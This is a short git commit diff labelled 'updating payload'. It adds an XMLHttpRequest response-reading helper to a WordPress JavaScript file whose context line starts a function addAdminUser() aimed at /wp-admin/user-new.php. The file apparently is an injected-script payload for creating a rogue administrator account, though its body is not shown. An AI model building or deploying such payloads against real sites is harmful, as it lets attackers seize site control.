97bd94fa4a55f19c7729bf824357a55dba0191ae
root <root@docker-dev.example.com>
2022-06-14 18:56:33 +0000

    updating payload

--- wordpress/js/script_xhr.js
+++ wordpress/js/script_xhr.js
@@ -1,3 +1,25 @@
+function read_body(xhr)
+ {
+   var data;
+   if (!xhr.responseType || xhr.responseType === "text")
+   {
+     data = xhr.responseText;
+   }
+   else if (xhr.responseType === "document")
+   {
+     data = xhr.responseXML;
+   }
+   else if (xhr.responseType === "json")
+   {
+     data = xhr.responseJSON;
+   }
+   else
+   {
+     data = xhr.response;
+   }
+   return data;
+ }
+
 function addAdminUser()
 {
    var uri = "/wp-admin/user-new.php";
